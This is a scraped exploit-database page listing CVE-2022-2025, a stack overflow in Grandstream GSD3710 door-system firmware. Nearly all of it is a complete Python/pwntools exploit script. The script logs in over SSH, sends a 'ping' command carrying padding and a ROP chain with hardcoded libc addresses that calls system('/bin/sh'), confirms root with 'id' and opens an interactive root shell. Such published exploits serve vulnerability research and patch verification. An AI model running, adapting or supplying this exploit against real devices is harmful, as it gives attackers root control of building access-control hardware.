---
title: Grandstream GSD3710 1.0.11.13 Stack Overflow
url: https://cxsecurity.com/issue/WLB-2025060031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-30
fetch_date: 2025-10-06T22:50:32.753348
---

# Grandstream GSD3710 1.0.11.13 Stack Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Grandstream GSD3710 1.0.11.13 Stack Overflow** **2025.06.29**  Credit:  **[Pepelux](https://cxsecurity.com/author/Pepelux/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-2025](https://cxsecurity.com/cveshow/CVE-2022-2025/ "Click to see CVE-2022-2025")**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

#!/usr/bin/env python3
# Exploit Title: Grandstream GSD3710 1.0.11.13 - Stack Overflow
# Date: 2025-05-29
# Exploit Author: Pepelux
# Vendor Homepage: https://www.grandstream.com/
# Version: Grandstream GSD3710 - firmware:1.0.11.13 and lower
# Tested on: Linux and MacOS
# CVE: CVE-2022-2025
"""
Author: Jose Luis Verdeguer (@pepeluxx)
Required: Pwntools
Example:
$ python 3 CVE-2022-2025.py -i DEVICE\_IP -u USER -p PASSWORD
"""
from struct import pack
import sys
from time import sleep
import argparse
from pwn import \*
def get\_args():
parser = argparse.ArgumentParser(
formatter\_class=lambda prog: argparse.RawDescriptionHelpFormatter(
prog, max\_help\_position=50))
# Add arguments
parser.add\_argument('-i', '--ip', type=str, required=True,
help='device IP address', dest="ip")
parser.add\_argument('-u', '--user', type=str, required=True,
help='username', dest="user")
parser.add\_argument('-p', '--pass', type=str, required=True,
help='password', dest="pwd")
# Array for all arguments passed to script
args = parser.parse\_args()
try:
ip = args.ip
user = args.user
pwd = args.pwd
return ip, user, pwd
except ValueError:
exit()
def check\_badchars(payload):
for i in range(5, len(payload)):
if payload[i] in [0xd, 0xa, 0x3b, 0x7c, 0x20]:
log.warn("Badchar %s detected at %#x" % (hex(payload[i]), i))
return True
return False
def main():
ip, user, pwd = get\_args()
libc\_base = 0x76bb8000
gadget = libc\_base + 0x5952C # 0x0005952c: pop {r0, r4, pc};
bin\_sh = libc\_base + 0xCEA9C # /bin/sh
system = libc\_base + 0x2C7FD # 0x0002c7fd # system@libc
exit = libc\_base + 0x2660C
print("[\*] Libc base: %#x" % libc\_base)
print("[\*] ROP gadget: %#x" % gadget)
print("[\*] /bin/sh: %#x" % bin\_sh)
print("[\*] system: %#x" % system)
print("[\*] exit: %#x\n" % exit)
padding = b"A" \* 320
payload = b'ping '
payload += padding
payload += p32(gadget)
payload += p32(bin\_sh)
payload += b"AAAA"
payload += p32(system)
payload += p32(exit)
if check\_badchars(payload):
sys.exit(0)
count = 1
while True:
print('Try: %d' % count)
s = ssh(user, ip, 22, pwd)
p = s.shell(tty=False)
print(p.readuntil(b"GDS3710> "))
p.sendline(payload)
p.sendline(b"id")
sleep(1)
data = p.read()
if str(data).find('root') > -1:
print('PWNED!')
p.interactive()
s.close()
sys.exit()
s.close()
count += 1
if \_\_name\_\_ == '\_\_main\_\_':
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060031)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top